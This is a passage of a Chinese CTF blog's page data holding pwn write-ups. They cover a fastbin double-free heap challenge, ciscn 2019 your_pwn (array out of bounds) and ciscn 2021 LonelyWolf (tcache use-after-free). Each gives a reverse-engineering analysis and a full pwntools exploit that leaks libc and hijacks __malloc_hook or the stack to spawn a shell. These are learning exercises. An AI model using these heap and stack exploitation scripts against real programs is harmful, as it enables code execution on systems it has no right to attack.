class=\"string\">&quot;Info index: &quot;</span>);</span><br><span class=\"line\">idx = read_num();</span><br><span class=\"line\"><span class=\"keyword\">for</span> ( i = start_ptr; i; i = *(i + <span class=\"number\">16</span>) )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( idx == *i )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(*(i + <span class=\"number\">8</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​        看起来问题不大。</p>\n<h2><span id=\"free\">free</span></h2><p>​        有uaf。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">free</span>(*(ptr + <span class=\"number\">1</span>));</span><br><span class=\"line\"><span class=\"built_in\">free</span>(ptr);</span><br></pre></td></tr></table></figure>\n<p>​        先后free了end ptr和start ptr，但是没有置0。</p>\n<h2><span id=\"edit\">edit</span></h2><p>​        有点类似show的逻辑。首先会比较输入的data的size与chunk本身的size，如果是小于等于的就memcopy过去，但是会多copy一个空字节，可能是作为截断。</p>\n<p>​        如果size比原本chunk大的话，就另外add一个size+1大小的chunk，并将内容copy，然后将原本的chunk的content指针改为新的chunk content，size也一并更改。这个操作就很逆天，总感觉哪里不太对。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">str_size = read_str(src, <span class=\"number\">256</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( str_size &lt;= *(i + <span class=\"number\">4</span>) )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">memcpy</span>(*(i + <span class=\"number\">8</span>), src, str_size + <span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  dest = <span class=\"built_in\">malloc</span>(str_size + <span class=\"number\">1</span>);</span><br><span class=\"line\">  <span class=\"built_in\">memcpy</span>(dest, src, str_size + <span class=\"number\">1</span>);</span><br><span class=\"line\">  *(i + <span class=\"number\">8</span>) = dest;</span><br><span class=\"line\">  *(i + <span class=\"number\">4</span>) = str_size;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Success&quot;</span>);</span><br></pre></td></tr></table></figure>\n<h1><span id=\"利用\">利用</span></h1><h3><span id=\"整体思路\">整体思路</span></h3><p>​        程序的关键就是如果两个chunk内容相同，可以操作第二个chunk来控制第一个chunk。比如我们可以借此来leak，edit chunk fd等。</p>\n<h3><span id=\"leak-unsorted-bin\">leak unsorted bin</span></h3><p>​            基于程序逻辑，我们add两个chunk，free掉chunk0，使其进入unsorted bin，虽然我们不能直接<code>show(0)</code>，但因为chunk1的content此时是指向chunk 0 content的，所以可以show 1来leak。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(<span class=\"string\">b&#x27;1&#x27;</span>*<span class=\"number\">0x90</span>)</span><br><span class=\"line\">add(<span class=\"string\">b&#x27;1&#x27;</span>*<span class=\"number\">0x90</span>)</span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\">data = p.recv(<span class=\"number\">6</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">malloc_hook = u64( data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)) - <span class=\"number\">88</span> - <span class=\"number\">0x10</span></span><br></pre></td></tr></table></figure>\n<h3><span id=\"劫持fastbin-fd\">劫持fastbin fd</span></h3><p>​        首先利用三个chunk构造double free，制造修改fd的机会。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(<span class=\"string\">b&#x27;2&#x27;</span>*<span class=\"number\">0x67</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;2&#x27;</span>*<span class=\"number\">0x67</span>)<span class=\"comment\">#3</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;3&#x27;</span>*<span class=\"number\">0x67</span>)<span class=\"comment\">#4</span></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">4</span>)</span><br><span class=\"line\">free(<span class=\"number\">3</span>)<span class=\"comment\">#doble free chunk0</span></span><br></pre></td></tr></table></figure>\n<p>​        然后按照一定顺序free掉它们，使得chunk2被double free。</p>\n<p>​        </p>\n<p>​    <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-09%20%E4%B8%8B%E5%8D%883.18.56.png\" alt=\"截屏2022-04-09 下午3.18.56\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(<span class=\"string\">b&#x27;1&#x27;</span>*<span class=\"number\">0x67</span>)<span class=\"comment\">#6 struct chunk =&gt; 0x7ffff7fff090,contenr chunk =&gt; 0x7ffff7fff020</span></span><br><span class=\"line\">edit(<span class=\"number\">6</span>,p64(malloc_hook-<span class=\"number\">35</span>))</span><br><span class=\"line\">add(<span class=\"string\">b&#x27;1&#x27;</span>*<span class=\"number\">0x67</span>)<span class=\"comment\">#7</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;3&#x27;</span>*<span class=\"number\">0x67</span>)<span class=\"comment\">#8</span></span><br></pre></td></tr></table></figure>\n<p>修改fd，使其指向<code>malloc_hook-35</code></p>\n<p>​        这里减去三十五是为了构造fake chunk的size位，使其合法。详情可以看这里的分析：<a href=\"https://fuurinko.github.io/2022/04/02/fastbin中uaf实现任意地址分配的检测问题/\">https://fuurinko.github.io/2022/04/02/fastbin中uaf实现任意地址分配的检测问题/</a></p>\n<p>​        接着只需要多add几个chunk，并编辑对应chunk为<code>one_gadget</code>即可。</p>\n<p>exp：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/glibc/2.23/64/lib/libc-2.23.so&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process([<span class=\"string\">&quot;/glibc/2.23/64/lib/ld-2.23.so&quot;</span>,<span class=\"string\">&quot;./double&quot;</span>],env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span> : <span class=\"string\">&quot;/glibc/2.23/64/lib/libc-2.23.so&quot;</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./double&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">target_addr = <span class=\"number\">0x4040c0</span> + <span class=\"number\">0x8</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">data</span>):</span></span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>,<span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&quot;Your data:&quot;</span>,data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span>(<span class=\"params\">idx,data</span>):</span></span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>,<span class=\"string\">b&#x27;3&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&quot;Info index: &quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    p.sendline(data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>,<span class=\"string\">b&#x27;4&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&quot;Info index: &quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>,<span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&quot;Info index: &quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;1&#x27;</span>*<span class=\"number\">0x90</span>)<span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;1&#x27;</span>*<span class=\"number\">0x90</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#add(b&#x27;1&#x27;*0x20)#5</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">data = p.recv(<span class=\"number\">6</span>)</span><br><span class=\"line\">malloc_hook = u64( data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)) - <span class=\"number\">88</span> - <span class=\"number\">0x10</span></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;malloc_hook =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(malloc_hook)))</span><br><span class=\"line\">libc_base = malloc_hook - libc.symbols[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]</span><br><span class=\"line\">one_gadget = libc_base + <span class=\"number\">0x4526A</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;2&#x27;</span>*<span class=\"number\">0x67</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;2&#x27;</span>*<span class=\"number\">0x67</span>)<span class=\"comment\">#3</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;3&#x27;</span>*<span class=\"number\">0x67</span>)<span class=\"comment\">#4</span></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">4</span>)</span><br><span class=\"line\">free(<span class=\"number\">3</span>)<span class=\"comment\">#doble free chunk0</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;1&#x27;</span>*<span class=\"number\">0x67</span>)<span class=\"comment\">#6 struct chunk =&gt; 0x7ffff7fff090,contenr chunk =&gt; 0x7ffff7fff020</span></span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">edit(<span class=\"number\">6</span>,p64(malloc_hook-<span class=\"number\">35</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;1&#x27;</span>*<span class=\"number\">0x67</span>)<span class=\"comment\">#7</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;3&#x27;</span>*<span class=\"number\">0x67</span>)<span class=\"comment\">#8</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">67</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">9</span>,<span class=\"string\">b&#x27;4&#x27;</span>*<span class=\"number\">19</span>+p64(one_gadget))<span class=\"comment\">#9</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>,<span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>​        人有点麻。</p>\n<p>​</p>\n","categories":["Binary_security"],"tags":["HEAP - Fastbin Attack"]},{"title":"2019_your_pwn","url":"/2022/03/14/ciscn_2019_your_pwn/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n\t\t\t<script>\n\t\t\t\tconsole.error(\"ReferenceError: value is not defined\");\n\t\t\t</script>     \n<p>​        因为是数组越界，每次只能读取一个字节，所以脚本需要循环，首先计算出偏移获取函数的地址，一般来说比较常规的思路是拿<code>libc_start_main</code>,只是这里的偏移比较远。</p>\n<p>​    ps： 关于如何在看起来比较混乱的栈中找到偏移量这件事</p>\n<p>​        首先要搞清楚函数逻辑，就是不管有多简单也不能想当然的那种搞清楚。</p>\n<p>​        这里一共有三个关键的变量，v4，idx和v2，idx是v4数组的索引，用来leak地址。v2用来填content，最后把v2赋给<code>v4[idx]</code>。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-14%20%E4%B8%8B%E5%8D%8810.00.59.png\" alt=\"截屏2022-03-14 下午10.00.59\"></p>\n<p>​        所以在地址上索引的地址和内容是不完全连续的。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8A%E5%8D%8810.45.31.png\" alt=\"截屏2022-03-15 上午10.45.31\"></p>\n<p>​        这里2e0是输入的idx，568是需要被泄露的地址，大致的索引应该是648左右，更精确的需要调试得出。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import LibcSearcher</span></span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> args[<span class=\"string\">&#x27;REMOTE&#x27;</span>]:</span><br><span class=\"line\">    p = remote()</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    p = process(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_start_main = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">one_gadget = <span class=\"number\">0x45216</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendafter(<span class=\"string\">&#x27;name&#x27;</span>,<span class=\"string\">&#x27;aa&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i  <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">638</span>,<span class=\"number\">632</span>,-<span class=\"number\">1</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;index\\n&#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;(hex) &#x27;</span>)</span><br><span class=\"line\">\txx = p.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>]</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;value\\n&#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"built_in\">len</span>(xx)&lt;<span class=\"number\">2</span>):</span><br><span class=\"line\">\t\tlibc_start_main += <span class=\"string\">&#x27;0&#x27;</span> + xx    </span><br><span class=\"line\">\t<span class=\"keyword\">elif</span>(<span class=\"built_in\">len</span>(xx)==<span class=\"number\">8</span>):</span><br><span class=\"line\">\t\tlibc_start_main += xx[-<span class=\"number\">2</span>:]</span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\tlibc_start_main += xx</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libc_start_main))</span><br><span class=\"line\">libc_start_main = <span class=\"built_in\">int</span>(<span class=\"string\">&#x27;0x&#x27;</span> + libc_start_main,<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base = libc_start_main-libc.symbols[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libc.symbols[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>]))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\">one_gadget += libc_base </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):   </span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;index\\n&#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">344</span>+i))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;value\\n&#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">ord</span>(p64(one_gadget)[i])))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n","categories":["Binary_security"],"tags":["STACK - ARRAY OUT OF BOUNDS"]},{"title":"LonelyWolf","url":"/2022/04/06/ciscn_2021_lonelywolf/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-lEeVUqUV\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<h2><span id=\"overview\">overview</span></h2><p>​        开始做一些ciscn了。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-06%20%E4%B8%8B%E5%8D%888.21.22.png\" alt=\"截屏2022-04-06 下午8.21.22\"></p>\n<h2><span id=\"re\">re</span></h2><h3><span id=\"add\">add</span></h3><p>​        size不能大于0x78。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">ptr = <span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( ptr )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"> size_struct = size_1;</span><br><span class=\"line\"> content_struct = ptr;<span class=\"comment\">//蚌埠住了，每次都会把这个指针覆盖为最新分配的content ptr。这下idx直接报废。</span></span><br><span class=\"line\"> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Done!&quot;</span>);</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-06%20%E4%B8%8B%E5%8D%888.32.06.png\" alt=\"截屏2022-04-06 下午8.32.06\"></p>\n<p>​        size和content的buf在空间中是相邻的。</p>\n<p>​        有一个值得注意的地方是，add的idx是可以指定的，并且在后面输入size的时候会覆盖idx。但是似乎意义不大。并且add的时候完全没有为不同的idx创建不同的chunk，所以这个程序其实很阴间，idx感觉就是一个烟雾弹。不管是这里的add还是后面的show，edit，都是默认编辑最近申请的chunk ptr。所以四舍五入我们只能完全控制一个chunk。                                                                                                                                                           </p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">__printf_chk(<span class=\"number\">1LL</span>, <span class=\"string\">&quot;Index: &quot;</span>);</span><br><span class=\"line\">__isoc99_scanf(&amp;dword_F44, &amp;size_1);</span><br><span class=\"line\">__printf_chk(<span class=\"number\">1LL</span>, <span class=\"string\">&quot;Size: &quot;</span>);</span><br><span class=\"line\">__isoc99_scanf(&amp;dword_F44, &amp;size_1);</span><br><span class=\"line\">size = size_1;</span><br></pre></td></tr></table></figure>\n<h3><span id=\"edit\">edit</span></h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( content_struct )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      __printf_chk(<span class=\"number\">1LL</span>, <span class=\"string\">&quot;Content: &quot;</span>);</span><br><span class=\"line\">      v0 = content_struct;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( size_struct )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v1 = (<span class=\"keyword\">char</span> *)content_struct + size_struct;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          read(<span class=\"number\">0</span>, v0, <span class=\"number\">1uLL</span>);</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( *v0 == <span class=\"string\">&#x27;\\n&#x27;</span> )</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( ++v0 == v1 )</span><br><span class=\"line\">            <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v4;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        *v0 = <span class=\"number\">0</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<p>​        当输入的地址递增到content_struct + size_struct，则终止输入。看似是没有堆溢出的。</p>\n<h3><span id=\"show\">show</span></h3><p>​        </p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( !idx &amp;&amp; content_struct )</span><br><span class=\"line\">   __printf_chk(<span class=\"number\">1LL</span>, <span class=\"string\">&quot;Content: %s\\n&quot;</span>, (<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *)content_struct);</span><br></pre></td></tr></table></figure>\n<h3><span id=\"free\">free</span></h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( !idx &amp;&amp; content_struct )</span><br><span class=\"line\">  <span class=\"built_in\">free</span>(content_struct);</span><br></pre></td></tr></table></figure>\n<p>​        UAF。</p>\n<h3><span id=\"动调\">动调</span></h3><p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-06%20%E4%B8%8B%E5%8D%889.52.10.png\" alt=\"截屏2022-04-06 下午9.52.10\"></p>\n<p>​        申请一个chunk，再free，内存如图。比较常规。</p>\n<h2><span id=\"加载符号表\">加载符号表</span></h2><p>​        这几个ciscn的题都比较鸡贼，需要自己找符号表加载，不然pwndgb都看不了heap等。</p>\n<p>​        执行一下看看小版本，然后去网上找有debug符号的libc，把符号表扒下来加载到程序上就行。实在找不到编译好的就找源码编译一下。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-06%20%E4%B8%8B%E5%8D%8810.29.13.png\" alt=\"截屏2022-04-06 下午10.29.13\"></p>\n<p>​        这个版本还是蛮阴间的，根本找不到，老老实实编译了。</p>\n<h2><span id=\"利用\">利用</span></h2><h4><span id=\"大致思路\">大致思路</span></h4><p>​        先想一想大体的利用思路吧，首先got表肯定不能改，所以getshell应该是改<code>malloc_hook</code>或者<code>free_hook</code>。因为有UAF，并且chunk的size限制得比较小，功能也比较完备，所以应该是改Tcache bin的fd，构造任意地址写，并将chunk分配至<code>hook</code>。</p>\n<p>​        leak的话，因为前面分析过，整个程序只能控制一个chunk，所以我们甚至没有办法利用unsortedbin来leak。既然这样的话，可以利用到tcache特有的leak方式。就是劫持tcache结构管理堆块，将这个堆块的size覆盖，。（因为程序在add的时候限制了大小，所以需要通过这个渠道来申请超大chunk）。</p>\n<p>​        回到题目本身，这个题之前一直没有认真做完，所以虽然完全不知道解法的细节，但是还是记得比较清楚，这个libc是有对于tcache double free的检测的，但是这个无奈这个程序的uaf漏洞实在过于强大，所以我们只需要把bk位覆盖成其他的什么垃圾数据就行。</p>\n<p>​        为了修改<code>malloc_hook</code>为<code>one_gadget</code>或者其他什么东西，我们首先需要将fake chunk分配至保存chunk ptr的buf上，劫持chunk ptr，将其修改为<code>malloc_hook</code>，然后编辑chunk content为<code>one_gadget</code>。</p>\n<p>​        所以在构造fake chunk前，我们肯定要leak buf的地址以及<code>malloc_hook</code>的地址。</p>\n<p>​        但是总感觉buf的addr并不好leak，所以能不能先leak <code>malloc_hoook</code>    ,然后直接劫持tcache fd到malloc hook上呢。</p>\n<h4><span id=\"tcache-double-free-leak-heap-addr\">tcache double free leak heap addr</span></h4><p>​        刚刚说到在这个漏洞下，劫持tcache fd非常容易，绕过key的检测也非常容易。我们先add再free，然后把检测位bk edit成任意垃圾数据，然后就能够再次free它了。这样就形成了双向循环链表，我们只要show出它，就能获得heap addr。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x78</span>)<span class=\"comment\">#idx0</span></span><br><span class=\"line\">free()</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x10</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x78</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Content: &quot;</span>)</span><br><span class=\"line\">heap_addr = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;heap_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(heap_addr)))</span><br></pre></td></tr></table></figure>\n<p>​        </p>\n<h4><span id=\"break-tcache-structure-to-leak-libc\">break tcache structure to leak libc</span></h4><p>​        获得heap地址后就能够算出tcache管理堆块的地址，接着就能够劫持tcache的管理堆块。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">tcache_addr = heap_addr - <span class=\"number\">0x260</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,p64(tcache_addr + <span class=\"number\">0x10</span>))</span><br><span class=\"line\"><span class=\"comment\">#将tcache的fd改为tcache+0x10</span></span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x78</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x78</span>)</span><br><span class=\"line\"><span class=\"comment\">#申请对应地址的fake chunk</span></span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">64</span>)</span><br><span class=\"line\"><span class=\"comment\">#修改tcache size为a。</span></span><br><span class=\"line\">free()</span><br><span class=\"line\"><span class=\"comment\">#free tcache fake chunk</span></span><br><span class=\"line\">show()</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Content: &quot;</span>)</span><br><span class=\"line\">data = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">malloc_hook = data - <span class=\"number\">0x70</span></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;malloc_hook =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(malloc_hook)))</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base = malloc_hook - libc.symbols[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">free_hook = libc_base + libc.symbols[<span class=\"string\">&#x27;__free_hook&#x27;</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;free_hook =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(free_hook)))</span><br><span class=\"line\"></span><br><span class=\"line\">system_addr = libc_base + libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;system_addr =&gt; 